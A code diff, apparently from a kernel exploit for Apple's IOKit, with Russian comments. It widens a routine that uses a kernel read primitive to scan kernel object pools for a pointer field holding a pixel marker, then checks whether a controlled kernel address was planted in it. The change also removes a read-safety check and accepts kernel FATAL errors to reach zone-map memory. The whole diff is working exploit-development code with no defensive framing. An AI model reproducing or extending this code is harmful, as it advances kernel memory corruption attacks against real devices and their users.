@@ -6296,14 +6296,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint32_t vaFldOff = 0;
     if (ctlKVA) {
         uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
-        uint64_t pools198[3] = { pd198, surfVA ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0, surfVA };
-        uint32_t poolSz198[3] = { 0x200, 0x100, 0x200 };
-        for (int pi = 0; pi < 3 && !vaFldObj; pi++) {
+        uint64_t pools198[16] = { pd198, surfVA ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0, surfVA };
+        uint32_t poolSz198[16] = { 0x200, 0x100, 0x200 };
+        int npool198 = 3;
+        // 1.9.199: + pointee-уровень plane-desc (IOMD sub-objects), кап 12
+        if (kpLooksLikeKernelPointer(pd198)) {
+            for (uint32_t o = 0; o + 8 <= 0x200 && npool198 < 15; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(pd198 + o));
+                if (!kpLooksLikeKernelPointer(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < npool198; j++) if (pools198[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools198[npool198] = Q; poolSz198[npool198] = 0x100; npool198++;
+                if (npool198 >= 15) break;
+            }
+        }
+        int nFld199 = 0;
+        for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
             uint64_t obj = pools198[pi];
             if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
             for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
                 uint64_t P = kp_untag_ptr(early_kread64(obj + o));
-                if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                if (!kpLooksLikeKernelPointer(P)) continue;
+                // 1.9.199: kpSafeToRead(P) УБРАН — walker слеп на zone-map VA (там и
+                // живёт буфер!), поле фильтровалось само. early_kread64 читает zone-map
+                // свободно; на невалидном — FATAL-шум, но не смерть.
+                nFld199++;
                 uint64_t v = early_kread64(P);
                 if ((uint32_t)v != 0x41544159) continue;   // маркер пикселей dst
                 vaFldObj = obj; vaFldOff = o; vaFldOld = P;
@@ -6315,7 +6333,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                           rb3 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
             }
         }
-        if (!vaFldObj) kpNote(r, @"  [VAD] VA-поле не найдено (pd/rangeObj/surf) — расширим на следующем билде");
+        if (!vaFldObj) kpNote(r, [NSString stringWithFormat:@"  [VAD] VA-поле не найдено (пулов=%d, полей проверено=%d) — следующий шаг: pv_head/второй уровень", npool198, nFld199]);
     }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
